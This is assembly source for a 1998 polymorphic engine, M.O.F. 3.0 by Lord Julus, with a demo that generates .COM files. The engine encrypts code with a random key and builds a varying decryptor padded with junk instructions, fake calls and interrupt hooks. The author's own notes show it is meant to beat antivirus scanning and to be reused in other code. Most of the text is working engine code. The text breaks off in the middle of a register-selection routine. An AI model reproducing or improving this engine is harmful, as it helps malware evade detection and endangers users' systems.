
Comment $

⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
≥        Multiple OpCode Fantasies (M.O.F.) Version 3.0                      ≥
≥                                                                            ≥
≥                 by Lord Julus                                              ≥
≥                                                                            ≥
≥        Project start -        10 February 1998                             ≥
≥        Project End   -        20 May      1998                             ≥
≥                                                                            ≥
≥        What does Mof Do ?                                                  ≥
≥                                                                            ≥
√ƒƒƒƒƒƒ( Parameters on entry  )ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
≥                                                                            ≥
≥               ˘ ds:si - a pointer to the original Code                     ≥
≥               ˘ dx    - a displacement from ds:si that points to the Code  ≥
≥                         that will get encrypted                            ≥
≥               ˘ es:di - a pointer to a buffer In Memory where the Code     ≥
≥                         will be put (the buffer must be able to also hold  ≥
≥                         the Decryptor)                                     ≥
≥               ˘ cx    - Length of the total original Code                  ≥
≥               ˘ bx    - Length of Code to be encrypted                     ≥
≥                                                                            ≥
√ƒƒƒƒƒƒ( Parameters on Exit  )ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
≥                                                                            ≥
≥               ˘ ds:si - a pointer to the encrypted Code including the      ≥
≥                         Decryptor                                          ≥
≥               ˘ es:di - a pointer to the Decryptor                         ≥
≥               ˘ cx    - Length of encrypted Code + Decryptor               ≥
≥                                                                            ≥
√ƒƒƒƒƒƒ( Warnings )ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
≥                                                                            ≥
≥               When entering the Decryptor, it will Assume that bp is set   ≥
≥               to the DELTA Handle, i.e. you should have something like     ≥
≥               This:                                                        ≥
≥                                                                            ≥
≥                       Call Get_delta                                       ≥
≥               Get_delta:                                                   ≥
≥                       Pop bp                                               ≥
≥                       Sub bp, Offset Get_delta                             ≥
≥                       Call Decryptor                                       ≥
≥                       ....                    ; misc. unencrypted data     ≥
≥               Encrypted_code:                                              ≥
≥                       ....                                                 ≥
≥               End_of_encrypted_code:                                       ≥
≥               Decryptor:                                                   ≥
≥                       ....                                                 ≥
≥                       Ret                                                  ≥
≥                                                                            ≥
≥                                                                            ≥
≥        Lemme get one thing straight: the program below is a demonstration  ≥
≥for the Mof engine I wrote. When run it will generate a number of .COM files≥
≥named mof00000.com up to mof99999.com, Each one with a different Decryptor. ≥
≥The only unchanged bytes are these:                                         ≥
≥                                                                            ≥
≥                 Call Get_bp                                                ≥
≥         Get_bp: Pop bp                                                     ≥
≥                 Sub bp, 103                                                ≥
≥                 ... (And some others)                                      ≥
≥                                                                            ≥
≥         When the generated files are scanned they may be recognized as a   ≥
≥variety of viruses as the above sequence appeares In 90% of the viruses     ≥
≥on the market.                                                              ≥
≥         As for the rest, the Decryptor will unscramble the Code And the    ≥
≥Code will print a string on the screen, then quit.                          ≥
≥         In order to detach the engine from This demo you will have to      ≥
≥remove some lines that are only used for .COM files alignement              ≥
≥                                                                            ≥
≥         This IS Not A VIRUS. THE M.O.F. ROUTINE CAN BE SAFELY REMOVED      ≥
≥         FROM This PROGRAM And USED FREE. THE AUTHOR IS Not RESPONSIBLE     ≥
≥         FOR THE MISSUSE OF THE M.O.F. ENGINE.                              ≥
≥                                             ⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ∑          ≥
≥                                             ≥ Lord Julus - 1998 ∫          ≥
≥                                             ¿ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕº          ≥
¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
≥  History:                                                                  ≥
≥            ˛ Version 0.1 Beta - Not released publicly. Had a lot of bugs,  ≥
≥                                 Out of which, a major one. Many thanx to   ≥
≥                                 Darkman/29A for pointing that one to me.   ≥
≥            ˛ Version 1.0      - Not released publicly. Solved the bugs.    ≥
≥                                 Added instructions Shr, Shl, Ror, Rol,     ≥
≥                                 Rcl, Rcr. The Int for decryption is still  ≥
≥                                 fix. Removed the FPU instructions becaused ≥
≥                                 they caused some CPU's to hang.            ≥
≥            ˛ Version 2.0      - First Public available form. Added a very  ≥
≥                                 powerful thing: Calls to back routines.    ≥
≥                                 This almost doubles the number of instr.   ≥
≥                                 the Decryptor executes.                    ≥
≥                                 However no armour against emulators.       ≥
≥                                 Still, resistant !                         ≥
≥                                 Drawback: haven't worked on the optimiza-  ≥
≥                                 tion yet... The engine keeps growing ;-(   ≥
≥            ˛ Version 3.0      - Major Add: Random on the decr. Interrupt   ≥
¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ

        $

.286

Sseg          Segment Byte Stack 'prog'
Sseg          Ends

Cseg          Segment Byte Public 'prog'

              Assume cs:Cseg, ds:Cseg, ss:Sseg

              Org 0h

              jumps

; In order to make this demo faster I used a free asm library I found over
; the Net. It's called ASMWiz, and the below declarations represent routines
; taken from the library this demo will use. Therefore, in order to compile
; and link this demo you need the asmwiz.lib file in the same directory.

Extrn         bc_asc2int:Near, bc_int2asc:Near, bk_getkey:Near
Extrn         dv_chrout:Near, dv_crlf:Near, dv_strout:Near
Extrn         s0_length:Near, mv_locate:Near, mv_where:Near
Extrn         df_open:Near, df_close:Near, df_write:Near

Main          Proc           Far

              Push cs cs                         ; you may want to skip this
              Pop ds es                          ; crap and jump to the
              Lea dx, welcome                    ; routine itself a little
              Call dv_strout                     ; below.
              Lea dx, str1                       ; Here I print the welcome
              Call dv_strout                     ; strings
              Lea di, string                     ;
Read_loop:                                       ; The main keyboard input
              Mov al, 1001b                      ; loop.
              Call bk_getkey                     ;
              Cmp al, 08h                        ; check for backspace...
              Jne Not_bk_space                   ;
              Dec di                             ;
              Jmp Pr_back                        ;
Not_bk_space:                                    ;
              Cmp al, 0Dh                        ; check for Enter...
              Je Over                            ;
              Cmp al, '0'                        ; check char betw 0 & 9
              Jb Read_loop                       ;
              Cmp al, '9'                        ;
              Ja Read_loop                       ;
              Stosb                              ;
Pr_back:                                         ;
              Call dv_chrout                     ;
              Jmp Read_loop                      ;
Over:                                            ;
              Call dv_crlf                       ;
              Lea dx, str2                       ; print smth...
              Call dv_strout                     ;
              Lea dx, str3                       ;
              Call dv_strout                     ;
              Call mv_where                      ;
              Mov Word Ptr position, dx          ;
                                                 ;
              Mov bl, 10d                        ;
              Mov si, Offset string              ;
              Call bc_asc2int                    ; convert ASCII to integer
                                                 ;
              Lea di, strnum                     ;
              Mov si, di                         ;
              Call s0_length                     ;
              Mov bp, di                         ;
              Add bp, cx                         ;
              Mov bl, 10d                        ;
              Mov cx, 0                          ;
              Xchg ax, cx                        ;
              Lea dx, filename                   ;
Rep_gen:                                         ;
              Call bc_int2asc                    ; convert integer to ascii
              Push cx                            ;
              Call s0_length                     ;
              Mov bp, di                         ;
              Add bp, cx                         ;
              Cmp cx, 5                          ;
              Je Not_zero                        ;
              Mov Byte Ptr [bp], '0'             ;
              Jmp Was_zero                       ;
Not_zero:                                        ;
              Mov Byte Ptr [bp], '.'             ;
Was_zero:                                        ;
              Pop cx                             ;
              Push dx                            ;
              Mov dx, Word Ptr position          ;
              Call mv_locate                     ;
              Pop dx                             ;
              Call dv_strout                     ;
                                                 ;
              Pusha                              ;
              Mov Word Ptr filenums, ax          ;
              Lea dx, filename                   ;
              Mov ax, 0111b                      ;
              Xor cx, cx                         ;
              Call df_open                       ;
              Jc Exit_error                      ;
                                                 ;
; Here we call the Poly Engine                   ;
                                                 ;
              Push ax bx dx                      ;
              Push di si es ds bp                ;
              Push cs cs                         ; DS = ES = CS
              Pop ds es                          ;
              Mov ax, 0                          ; no flags in this version
              Lea si, Start_of_code              ; DS:SI = code
              Lea di, buffer                     ; ES:DI = buffer for code
              Mov dx, Encr_code-Start_of_code    ; displacement to encrypted code
              Add dx, 100h                       ; alignement for COM files
              Mov cx, End_encr_code-Start_of_code; length of code
              Mov bx, End_encr_code-Encr_code    ; length of code to be encrypted
                                                 ;
              Call Mof                           ; call the Poly Engine
                                                 ;
              Pop bp ds es si di                 ;
              Pop dx bx ax                       ;
                                                 ;
              Lea dx, buffer                     ;
              Call df_write                      ;
              Jc Exit_error                      ;
                                                 ;
              Call df_close                      ;
              Popa                               ;
                                                 ;
              Mov ax, Word Ptr filenums          ;
              Inc ax                             ;
              Cmp ax, cx                         ;
              Jne Rep_gen                        ;
              Lea dx, str4                       ;
              Call dv_strout                     ;
                                                 ;
              Mov ax,4C00h                       ; end of demo
              Int 21h                            ;
Exit_error:                                      ;
              Lea dx, str5                       ;
              Call dv_strout                     ;
              Mov ax, 4C01h                      ; end w/ error
              Int 21h                            ;
Main          Endp                               ;


;,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~`
;      M u l t i p l e  O p C o d e  F a n t a s i e s ( C ) 1 9 9 8
;`~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,

;,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~`
;     A Polymorphic Engine Written  by Lord Julus in the year of 1998
;`~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,

Comment $
÷ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ∑
∫ Hi ! This is the official Comment of the author on behalf of his poly      ∫
∫ engine. This engine will scramble the given Code using one of the three    ∫
∫ Operations: Xor, Add, Sub. As you noticed, the encrypted Code may be       ∫
∫ different from the entire Code processed by the engine Into it`s buffer,   ∫
∫ giving more flexibility. After the Code is copied, the part to be          ∫
∫ encrypted is encrypted using a Random key. After that, the poly Decryptor  ∫
∫ is generated. Basicly, the Decryptor will hook an interrupt (06/19/12,etc) ∫
∫ And set it`s vector to a special routine. This routine will provide        ∫
∫ decryption during the decryption phase. The registers used here are ax,    ∫
∫ bx, cx, dx, si, di. Each of these can hold the Code, key, counter. Also,   ∫
∫ bx, di, si can be used to point Into the Code. The engine chooses randomly ∫
∫ one of these leaving 2 junk general registers And 1 junk pointer register. ∫
∫ Between the real intructions of the Decryptor, the engine will generate    ∫
∫ a Random number of junk instructions. These instructions may contain also  ∫
∫ jumps, calls to fake routines, interrupt calls And privileged instructions.∫
∫ Also, many instructions that `look` like the ones inside the Decryptor,    ∫
∫ so it`ll be very hard to find the real instructions.                       ∫
∫                                                                            ∫
∫                                               ⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø      ∫
∫                                               ≥  Lord Julus - 1998  ∫      ∫
∫                                               ¿ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕº      ∫
∫                                                                            ∫
∫   Please write your opinions At: LordJulus@Geocities.Com                   ∫
∫                                                                            ∫
∫   Check Out my articles At: HTTP://Members.Tripod.Com/~lordjulus           ∫
∫                                                                            ∫
”ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒΩ

        $

Mof    Proc Near                          ; Multiple Opcodes Fantasies !!
       Pushf                              ; save the flags
       Push es ds di si bp                ; and the rest
       Push cs cs                         ; make DS = ES = CS
       Pop ds es                          ;   (kinda redundant)
                                          ;
       Mov buffer_address, di             ; save start of code for later
       Call Randomize                     ; initialize the rnd. nr. generator
       Call Choose_registers              ; Choose the random registers to use
       Mov ax, 0FFFEh                     ;
       Call Random                        ; generate random key
       Mov Word Ptr key, ax               ; save it
       Shr bx, 1                          ; divide code length by 2 -> words
       Mov Word Ptr code_len, bx          ; save code length
       Mov Word Ptr code_start, si        ; save code start
       Mov ax, Offset Start_of_code       ; ax holds the start of code
       Add ax, dx                         ; align it to the part to be
       Sub ax, Word Ptr code_start        ; encrypted
       Xchg ax, Word Ptr code_start       ; and save it into the code_start
       Mov ax, 2                          ; choose random method
       Call Random                        ;
       Mov Word Ptr method, ax            ; and save it
                                          ;
       Push cx si di                      ; push stuff
       Cld                                ; copy the original source code
       Rep Movsb                          ; from ds:si to es:di
       Mov ax, di                         ; save the place we are at
       Pop di si cx                       ; and pop stuff
                                          ;
       Mov cx, Word Ptr code_len          ; cx is the code length
       Push ax                            ;
       Mov ax, Word Ptr key               ; ax is the 'Keeper Of The Key' ;-)
       Add di, dx                         ; we encrypt from si+dx
       Sub di, 100h                       ; THIS ALIGNEMENT IS PUT HERE ONLY
                                          ; BECAUSE THIS DEMO GENERATES .COM
                                          ; FILES. BEWARE !!
Encrypt_loop:                             ; Here we encrypt the code that
       Cmp Word Ptr method, 0             ; will get decrypted by the poly
       Jne Not_xor                        ; decryptor
       Xor Word Ptr [di], ax              ; XOR method
       Jmp Continue                       ;
Not_xor:                                  ;
       Cmp Word Ptr method, 1             ;
       Jne Not_add                        ;
       Add Word Ptr [di], ax              ; ADD method
       Jmp Continue                       ;
Not_add:                                  ;
       Sub Word Ptr [di], ax              ; SUB method
Continue:                                 ;
       Inc di                             ; increment pointer
       Inc di                             ;
       Inc ax                             ; increment key (sliding key)
       Loop Encrypt_loop                  ; ...do it again !
       Pop ax                             ;
       Mov di, ax                         ; restore di
       Mov decr_entry, di                 ; save decryptor entry
       Push di                            ; save it...
                                          ;
       Mov cx, decryptor_len              ; take the decryptor length
       Lea bx, Decryptors_table           ; bx is the Decryptor's pointer
                                          ;
       Mov counter, 1                     ; this is useful, trust me...
       Mov Word Ptr last_instr, di        ; this addr will always hold the
       Mov Word Ptr last_call, 0          ; ofs of the end of the crt. instr.
       Mov Byte Ptr call_allow, 0         ;
       Mov Byte Ptr in_call, 0            ;
       Mov Byte Ptr allowence, 0          ;
                                          ;
Repeat_generator:                         ; this is the main generator loop
       Cmp counter, 0Ch                   ; for instruction no. 0Ch and 01h
       Je No_garbage                      ; we don't create junk after.
       Cmp counter, 1                     ;
       Je No_garbage                      ;
       Call Garbage_generator             ; generate some garbage
                                          ;
No_garbage:                               ;
       Xor ax, ax                         ; ax = 0
       Mov al, Byte Ptr [bx]              ; al holds the number of the instr.
       Call Go_to_instr                   ; make SI point to the instruction
                                          ; with the number held in AL
       Call Compute_addresses             ; compute the pointers and addrs.
                                          ;
Rep_put_instr:                            ;
       Lodsb                              ; now take the instruction.
       Cmp al, 0FEh                       ; marker for the place to fill ?
       Jne Once_again                     ;
       Mov ax, Word Ptr counter           ; restore instr. nr. into AX
       Call Fill_reg_mod_data             ; Call the filling routine
       Jmp Rep_put_instr                  ;
                                          ;
Once_again:                               ;
       Cmp al, 0FFh                       ; and check if we're done
       Je Over_this                       ;
       Stosb                              ; if not put it where it belongs
       Cmp al, 033h                       ; marker for method ?
       Jne Not_method                     ;
       Cmp Word Ptr counter, 4            ; into the instr. no. 4
       Jne Not_method                     ;
       Lea bp, Method_op                  ; if so, take the opcode for method
       Mov ax, Word Ptr method            ;
       Add bp, ax                         ;
       Mov al, [bp]                       ;
       Mov Byte Ptr [di-1], al            ; and put it where it belongs...
                                          ;
Not_method:                               ;
       Jmp Rep_put_instr                  ; and repeat this
                                          ;
Over_this:                                ;
       Inc Word Ptr counter               ;
       Inc bx                             ; increment the table counter
       Mov Word Ptr last_instr, di        ; save last instruction's end
       Loop Repeat_generator              ; and generate another instruction
                                          ;
       Mov cx, buffer_address             ;
       Xchg di, cx                        ;
       Sub cx, di                         ;
                                          ;
       Pop di                             ; restore DI to the beginning of
       Call Fill_addresses                ; the decryptor and fill the addrs.
                                          ;
       Pop bp si di ds es                 ; restore all the registers now
       Popf                               ;
       Ret                                ; And exit from the engine

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;±±                                                                         ±±
;±±  Here we have the routines to fill the data area (addresses & pointers) ±±
;±±                                                                         ±±
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

Compute_addresses Proc Near               ; Here we compute different addrs.
       Pusha                              ; within the decryptor.
       Push di si                         ; first we save  regs we'll loose
       Mov ax, instr_number               ; ax holds the number of instrs.
       Sub ax, cx                         ; and now AL = the current instr.
       Inc ax                             ;
       Cmp ax, 0Fh                        ;
       Jne Not_entry                      ;
       Mov cx, decr_entry                 ;
       Mov dx, di                         ;
       Sub dx, cx                         ;
       Mov bx, Offset poly_entry          ;
       Sub bx, Offset Start_of_code       ;
       Add bx, Offset buffer              ;
       Mov Word Ptr [bx], dx              ;
                                          ;
Not_entry:                                ;
       Lea si, Data_instr_place           ; we are about to compare AL with
       Mov cx, 12d                        ; this 12 bytes long string. These
Loop_1:                                   ; gives us the offsets.
       Cmp al, Byte Ptr [si]              ; and if we found it we go and
       Je Found_it_1                      ; save it
                                          ;
Fnd_ret1:                                 ;
       Inc si                             ;
       Loop Loop_1                        ;
                                          ;
Ret_here:                                 ;
       Lea si, Pos_refference             ; otherwise we look wether we have
       Mov cx, 12d                        ; position refferences. These gives
Loop_2:                                   ; us the values to put at the
       Cmp al, Byte Ptr [si]              ; offsets.
       Je Found_it_2                      ;
                                          ;
Fnd_ret2:                                 ;
       Inc si                             ;
       Loop Loop_2                        ;
       Jmp No_one                         ;
                                          ;
Found_it_1:                               ;
       Push ax si                         ;
       Lea si, Offsets                    ; go to the offsets table
       Mov ax, 12d                        ;
       Sub ax, cx                         ;
       Shl ax, 1                          ;
       Add si, ax                         ; and align it with the current
       Mov ax, Word Ptr last_instr        ;
       Mov Word Ptr [si], ax              ; and save the offset of the
       Pop si ax                          ; current instruction
       Jmp Fnd_ret1                       ;
                                          ;                                          ;
Found_it_2:                               ;
       Push ax si                         ;
       Lea si, Values                     ; and here we have the values
       Mov ax, 12d                        ;
       Sub ax, cx                         ;
       Shl ax, 1                          ; ax = ax * 2
       Add si, ax                         ;
       Mov Word Ptr [si], di              ;
       Pop si ax                          ;
       Jmp Fnd_ret2                       ;
                                          ;
No_one:                                   ;
       Pop si di                          ; restore the stuff...
       Popa                               ;
       Ret                                ; go back...
Compute_addresses Endp                    ;
                                          ;
Fill_addresses Proc Near                  ;
       Pusha                              ;
       Lea si, Offsets                    ; pointer to the offsets
       Lea bx, Values                     ; pointer to the values
       Mov cx, 12d                        ; we have 12 places
                                          ;
Loop_fill:                                ;
       Mov di, Word Ptr [si]              ; DI holds the offset
       Mov ax, Word Ptr [bx]              ; AX holds the value to put there
       Cmp cx, 11d                        ; we first look for the first 2
       Jb Not_jumps                       ; instructions (the jumps)
       Sub di, 2                          ; where we have to decrease DI by 2
       Sub ax, di                         ; and compute the JMP/JZ length
       Sub ax, 2                          ; by substracting one from the
       Mov Word Ptr [di], ax              ; other
       Jmp Again_1                        ;
                                          ;
Not_jumps:                                ;
       Sub di, 2                          ; otherwise, we have to mark a word
       Sub ax, Offset Buffer_start        ;
       Add ax, 100h                       ; WARNING ! COM. FILES ONLY !!!
                                          ;
       Cmp cx, 7                          ; Also some specific values.
       Jne Not_code_start                 ; The address for the code start
       Mov ax, Word Ptr code_start        ;
                                          ;
Not_code_start:                           ;
       Cmp cx, 6                          ;
       Jne Not_length                     ;
       Mov ax, Word Ptr code_len          ; The length of the code
                                          ;
Not_length:                               ;
       Cmp cx, 5                          ;
       Jne Not_key                        ;
       Mov ax, Word Ptr key               ; And the encryption key
                                          ;
Not_key:                                  ;
       Mov Word Ptr [di], ax              ; at DI-2 we have a word
Again_1:                                  ;
       Add si, 2                          ; we increase the 2 pointers in the
       Add bx, 2                          ; tables
       Loop Loop_fill                     ; and loop...
       Popa                               ;
       Ret                                ; that's it !
Fill_addresses Endp                       ;

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;±±                                                                         ±±
;±±  Here we have the routines to fill the signifiant 'mod' & 'reg' fields  ±±
;±±                                                                         ±±
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

Fill_reg_mod_data Proc Near               ; This routine properly fills the
      Pusha                               ; current instruction with the
      Push si di                          ; correct reg/mod fields.
      Dec di                              ; the instr. is one byte behind
      Lea si, Used_stuff_table            ; si points to the used table
      Add si, ax                          ; aligned for the current instr.
      Dec si                              ;
      Xor cx, cx                          ;
      Mov cl, Byte Ptr [si]               ; take it into CX
      And cl, 11100000b                   ; isolate signifiant bits
                                          ;
      Cmp cl, 11100000b                   ; Do we have 'DON`T TOUCH' ?
      Je Mod111                           ;
      Cmp cl, 10000000b                   ; Do we have 'REG 2 REG' ?
      Je Mod100                           ;
      Cmp cl, 11000000b                   ; Do we have 'MOD ONLY' ?
      Je Mod110                           ;
      Cmp cl, 10100000b                   ; Do we have 'REG ONLY' ?
      Je Mod101                           ;
      Cmp cl, 01100000b                   ; Do we have 'REG & MOD' ?
      Je Mod011                           ;
      Hlt                                 ; other is an Exception Error
                                          ;
Mod011:                                   ;
      Call Fill_mod                       ; fill the mod...
      Call Fill_reg                       ; fill the reg...
      Jmp Zup                             ;
                                          ;
Mod101:                                   ;
      Call Fill_reg                       ; fill the reg...
      Jmp Zup                             ;
                                          ;
Mod110:                                   ;
      Call Fill_mod                       ; fill the mod...
      Jmp Zup                             ;
                                          ;
Mod100:                                   ;
      Call Fill_reg2reg                   ; fill reg to reg...
      Jmp Zup                             ;
                                          ;
Mod111:                                   ;
Zup:                                      ;
      Pop di si                           ;
      Popa                                ;
      Ret                                 ; return :'-(
Fill_reg_mod_data Endp                    ;
                                          ;
Fill_mod Proc Near                        ; Routine to fill the mod field
     Mov bl, Byte Ptr preg                ; get the 'mod' from the preg
     Or [di], bl                          ; and fill the data in the current
     Ret                                  ; instruction.
Fill_mod Endp                             ;
                                          ;
Fill_reg2reg Proc Near                    ; Routine for Reg to Reg instr.
     Xor dx, dx                           ; First clear the registers to use
     Xor ax, ax                           ;
     Mov cl, Byte Ptr [si+49d]            ; about to find the 2 registers
     Push cx                              ; save this
     Mov al, cl                           ; we have here the first register
     And al, 00111000b                    ; on these bits' displacement
     Shr al, 3                            ; so we align them
     Pop cx                               ; and we are about to pick the
     Mov dl, cl                           ; second register
     And dl, 00000111b                    ; which is at this bits' displ.
     Lea bx, Used_registers               ; we point to registers
     Add bx, ax                           ; we add the first displacement
     Mov al, Byte Ptr [bx]                ; and take the register
     Lea bx, Used_registers               ; then we do the same thing
     Add bx, dx                           ; for the second register
     Mov dl, Byte Ptr [bx]                ; except that this one we align to
     Shr dl, 3                            ; the end of the byte
     Or Byte Ptr [di], dl                 ; and then we fill our instruction
     Or Byte Ptr [di], al                 ; with the registers.
     Ret                                  ; Done !
Fill_reg2reg Endp                         ;
                                          ;
Fill_reg Proc Near                        ; Routine to fill the reg field
     Xor cx, cx                           ;
     Mov cl, Byte Ptr [si]                ;
     And cl, 00011100b                    ; isolate the REG
     Shr cl, 2                            ; shift right
     Lea bx, Used_registers               ; BX points to the registers
     Add bx, cx                           ; align it to the correct reg.
     Mov al, Byte Ptr [bx]                ; and take it
     Mov bl, al                           ;
                                          ;
Do_reg_fill:                              ;
     Mov cl, Byte Ptr [si+49d]            ; about to determine the reg pos.
     And cl, 00000111b                    ;
     Shr bl, cl                           ; mov it to it's position
     Or Byte Ptr [di], bl                 ;
     Ret                                  ;
Fill_reg Endp                             ;

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;±±                                                                         ±±
;±±  Here we have a routine that searches for the current instruction.      ±±
;±±                                                                         ±±
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

Go_to_instr Proc Near                     ; Procedure to Go to instr nr AX
       Push cx                            ; save loop counter
       Lea si, Instr_table                ; SI = pointer to the instr. table
       Mov cx, 1                          ; cx = new counter
                                          ;
Rep_search:                               ;
       Cmp cx, ax                         ; did I find it ?
       Je Over_search                     ; yeah !
                                          ;
Rep_nest:                                 ;
       Inc si                             ; increment instr. pointer
       Cmp Byte Ptr [si], 0FFh            ; check the end of instr.
       Jne Rep_nest                       ;
       Inc si                             ;
       Inc cx                             ; increment CX for another instr.
       Jmp Rep_search                     ; and repeat search
                                          ;
Over_search:                              ;
       Pop cx                             ; now SI points to the instruction
       Ret                                ; given initialy into AX
Go_to_instr Endp                          ; and we return in order to 'lodsb'
                                          ; it !

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;±±                                                                         ±±
;±±  Here is the main random chooser: registers and pointers and junks      ±±
;±±                                                                         ±±
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

Choose_registers Proc Near                ; Here we choose the random regs
        Pusha                             ;
        Push di si                        ;
        Lea si, Mod_opcode                ; first choose the pointer
        Mov ax, 3                         ; 3 posib.
        Call Random                       ;
        Mov Byte Ptr misc, al             ; save al
        Add si, ax                        ; align the pointer
        Lodsb                             ; take a byte
        Mov preg, al                      ; and save it as the pointer reg.
        Lea si, Mod_opcode                ; then return to the opcode list
        Mov counter, 3                    ; create a counter
                                          ;
Rep_mod:                                  ;
        Lodsb                             ; and start taking the rest of
        Cmp preg, al                      ; the registers. Compare them
        Jne Not_preg                      ; w/ preg so they don't step
        Jmp Rep_mod                       ; on each other's feet ;-)
                                          ;
Not_preg:                                 ;
        Cmp counter, 2                    ; if counter is 2 then
        Je Not_1                          ;
        Mov jprg2, al                     ; we have the first junk register
        Dec counter                       ; and we decrement the counter
        Jmp Rep_mod                       ;
                                          ;
Not_1:                                    ;
        Mov jprg1, al                     ; otherwise we have the second
                                          ; junk pointer
Over_mod:                                 ;
        Mov cx, 50d                       ; now about to mangle the registers
        Xor bx, bx                        ; in a random order 50 times.
                                          ;
Rnd_loop:                                 ;
        Lea si, reg_order                 ; si = di = the registers' order
        Lea di, reg_order                 ;
        Mov ax, 6                         ; we generate a number betw 0 & 5
        Call Random                       ;
        Add si, ax                        ; and we align si after that
        Mov dx, si                        ; save si into dx
        Lodsb                             ; and take the byte
        Mov bx, ax                        ; save the byte into bx
        Mov ax, 6                         ; and generate another random
        Call Random                       ; in the same boudaries
        Lea si, reg_order                 ; again align...
        Add si, ax                        ;
        Mov di, si                        ; save si again...
        Lodsb                             ; take another byte into ax.
        Cmp bx, ax                        ; don't exchange with itself...
        Je Rnd_loop                       ;
        Xchg ax, bx                       ; otherwise exchange them
        Stosb                             ; and store them the other way
        Xchg ax, bx                       ; around. This stuff basicaly
        Mov di, dx                        ; exchanges 2 random positions betw
        Stosb                             ; them 50 times...
        Loop Rnd_loop                     ;
                                          ;
        Mov dl, Byte Ptr misc             ; now we are about to search for
        Add dl, 4                         ; the pointer register and move
        Mov cx, 6                         ; it to the end...
        Lea si, reg_order                 ;
Scan_4_reg:                               ; trust me, this is what this
        Lodsb                             ; does...
        Cmp al, dl                        ;
        Jne Not_found                     ;
        Cmp cx, 1                         ;
        Jne Not_ok                        ;
        Jmp Not_found                     ;
                                          ;
Not_ok:                                   ;
        Sub si, 1                         ;
        Push si                           ;
        Lea si, reg_order                 ;
        Add si, 5                         ;
        Push si                           ;
        Xchg ah, al                       ;
        Lodsb                             ;
        Xchg ah, al                       ;
        Pop di                            ;
        Stosb                             ;
        Xchg ah, al                       ;
        Pop di                            ;
        Stosb                             ;
        Jmp Out_of_here                   ;
                                          ;
Not_found:                                ;
        Loop Scan_4_reg                   ; ...until here :-<< unoptimized !
                                          ;
Out_of_here:                              ;
        Lea di, Used_registers            ;
